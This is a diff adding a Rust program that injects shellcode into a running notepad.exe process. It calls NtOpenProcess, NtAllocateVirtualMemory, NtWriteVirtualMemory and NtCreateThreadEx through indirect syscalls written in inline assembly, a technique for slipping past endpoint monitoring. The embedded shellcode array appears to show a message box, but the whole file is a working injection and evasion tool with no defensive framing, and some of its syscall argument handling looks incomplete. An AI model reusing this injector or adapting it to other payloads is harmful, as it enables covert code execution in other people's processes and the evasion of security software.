@@ -1,0 +1,238 @@
+use std::arch::asm;
+use std::ffi::CString;
+use std::ptr::{self, null_mut};
+use winapi::shared::basetsd::SIZE_T;
+use winapi::um::errhandlingapi::GetLastError;
+use winapi::um::handleapi::CloseHandle;
+use winapi::um::tlhelp32::{CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS};
+use winapi::um::winnt::{
+  HANDLE, PVOID,
+};
+use winapi::um::libloaderapi::GetProcAddress;
+use winapi::um::libloaderapi::GetModuleHandleA;
+
+
+unsafe fn resolve_syscall(name: &str) -> Option<(u32, usize)> {
+    // Get handle to ntdll
+    let ntdll = GetModuleHandleA("ntdll.dll\0".as_ptr() as *const i8);
+    if ntdll.is_null() {
+        return None;
+    }
+
+    // Get function address
+    let func_address = GetProcAddress(ntdll, name.as_ptr() as *const i8);
+    if func_address.is_null() {
+        return None;
+    }
+
+    // Extract syscall number and syscall instruction address
+    let syscall_number = *(func_address.add(4) as *const u8) as u32;
+    let syscall_instruction = func_address.add(0x12);
+    Some((syscall_number, syscall_instruction as usize))
+}
+
+
+unsafe fn open_process(pid: u32) -> Option<HANDLE> {
+    let (syscall_number, syscall_address) = resolve_syscall("NtOpenProcess\0").unwrap();
+
+    let mut process_handle: HANDLE = ptr::null_mut();
+    let object_attributes: usize = 0; // Default attributes
+    let client_id = [pid as usize, 0]; // ClientId with PID
+
+    let status: u32;
+    asm!(
+        "mov r10, rcx",
+        "call {syscall}",
+        syscall = in(reg) syscall_address,
+        inout("eax") syscall_number => status,
+        in("rcx") &mut process_handle,
+        in("rdx") 0x1fffff, // Desired access
+        in("r8") &object_attributes,
+        in("r9") &client_id,
+        options(nostack)
+    );
+
+    if status == 0 { Some(process_handle) } else { None }
+}
+
+
+unsafe fn nt_allocate_virtual_memory(
+    process_handle: HANDLE,
+    alloc_address: *mut PVOID,
+    size: &mut SIZE_T,
+) -> bool {
+    let (syscall_number, syscall_address) = resolve_syscall("NtAllocateVirtualMemory\0").unwrap();
+
+    let status: u32;
+    asm!(
+        "mov r10, rcx",
+        "call {syscall}",
+        syscall = in(reg) syscall_address,
+        inout("eax") syscall_number => status,
+        in("rcx") process_handle,
+        in("rdx") alloc_address,
+        in("r8") ptr::null::<usize>(), 
+        in("r9") size,
+        options(nostack)
+    );
+    status == 0
+}
+
+unsafe fn nt_write_virtual_memory(
+    process_handle: HANDLE,
+    base_address: PVOID,
+    buffer: &[u8],
+) -> bool {
+    let (syscall_number, syscall_address) = resolve_syscall("NtWriteVirtualMemory\0").unwrap();
+
+    let mut bytes_written: SIZE_T = 0;
+    let status: u32;
+    asm!(
+        "mov r10, rcx",
+        "call {syscall}",
+        syscall = in(reg) syscall_address,
+        inout("eax") syscall_number => status,
+        in("rcx") process_handle,
+        in("rdx") base_address,
+        in("r8") buffer.as_ptr(),
+        in("r9") buffer.len(),
+        options(nostack)
+    );
+    status == 0
+}
+
+unsafe fn nt_create_thread_ex(
+    process_handle: HANDLE,
+    start_address: PVOID,
+) -> bool {
+    let (syscall_number, syscall_address) = resolve_syscall("NtCreateThreadEx\0").unwrap();
+
+    let thread_handle: HANDLE = ptr::null_mut();
+    let status: u32;
+    asm!(
+        "mov r10, rcx",
+        "call {syscall}",
+        syscall = in(reg) syscall_address,
+        inout("eax") syscall_number => status,
+        in("rcx") &thread_handle,
+        in("rdx") process_handle,
+        in("r8") start_address,
+        options(nostack)
+    );
+    status == 0
+}
+
+pub fn execute(){
+    unsafe {
+
+        let process_name = "notepad.exe";
+        let pid = get_pid(process_name);
+        println!("PID: {}", pid);
+
+        let target_process = open_process(pid).expect("Failed to open process");
+
+        println!("Target process opened successfully: {:?}", target_process);
+
+        let mut alloc_address: PVOID = ptr::null_mut();
+        let mut alloc_size: SIZE_T = 0x1000;
+        if !nt_allocate_virtual_memory(
+            target_process,
+            &mut alloc_address as *mut _ as *mut _,
+            &mut alloc_size,
+        ) {
+            eprintln!("NtAllocateVirtualMemory failed");
+            return;
+        }
+
+
+        // Define the shellcode
+        let shellcode:[u8; 328] = [0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,
+        0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,
+        0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,0x8b,
+        0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,0x50,
+        0x3e,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,
+        0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
+        0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,0x48,0x8b,0x52,0x20,
+        0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,0x00,
+        0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,0x3e,
+        0x8b,0x48,0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,
+        0x5c,0x48,0xff,0xc9,0x3e,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
+        0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
+        0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,0x08,
+        0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,0x49,
+        0x01,0xd0,0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,0x40,
+        0x1c,0x49,0x01,0xd0,0x3e,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,
+        0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,
+        0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,
+        0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,0x3e,
+        0x48,0x8d,0x8d,0x30,0x01,0x00,0x00,0x41,0xba,0x4c,0x77,0x26,
+        0x07,0xff,0xd5,0x49,0xc7,0xc1,0x00,0x00,0x00,0x00,0x3e,0x48,
+        0x8d,0x95,0x0e,0x01,0x00,0x00,0x3e,0x4c,0x8d,0x85,0x24,0x01,
+        0x00,0x00,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,
+        0xd5,0x48,0x31,0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5,
+        0x48,0x65,0x79,0x20,0x6d,0x61,0x6e,0x2e,0x20,0x49,0x74,0x73,
+        0x20,0x6d,0x65,0x20,0x53,0x6d,0x75,0x6b,0x78,0x00,0x6b,0x6e,
+        0x6f,0x63,0x6b,0x2d,0x6b,0x6e,0x6f,0x63,0x6b,0x00,0x75,0x73,
+        0x65,0x72,0x33,0x32,0x2e,0x64,0x6c,0x6c,0x00 ];
+    
+        // Write shellcode into allocated memory
+        if !nt_write_virtual_memory(
+            target_process, 
+            alloc_address, 
+            &shellcode
+        ) {
+            eprintln!("NtWriteVirtualMemory failed");
+            return;
+        }
+
+        // Create a new thread to execute the shellcode
+        if !nt_create_thread_ex(target_process, alloc_address) {
+            eprintln!("NtCreateThreadEx failed");
+            return;
+        }
+
+        println!("Shellcode executed successfully.");
+    }
+}
+
+
+fn get_pid(process_name: &str) -> u32{
+    unsafe{
+        let mut pe: PROCESSENTRY32 = std::mem::zeroed();
+        pe.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;
+
+        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if snap.is_null(){
+            println!("Error while snapshoting processes : Error : {}",GetLastError());
+            std::process::exit(0);
+        }
+
+        let mut pid = 0;
+
+        let mut result = Process32First(snap, &mut pe) != 0;
+
+        while result{
+
+            let exe_file = CString::from_vec_unchecked(pe.szExeFile
+                .iter()
+                .map(|&file| file as u8)
+                .take_while(|&c| c!=0)
+                .collect::<Vec<u8>>(),
+            );
+
+            if exe_file.to_str().unwrap() == process_name {
+                pid = pe.th32ProcessID;
+                break;
+            }
+            result = Process32Next(snap, &mut pe) !=0;
+        }
+
+        if pid == 0{
+            println!("Unable to get PID for {}: {}",process_name , "PROCESS DOESNT EXISTS");           
+            std::process::exit(0);
+        }
+    
+        CloseHandle(snap);
+        pid
+    }
+}
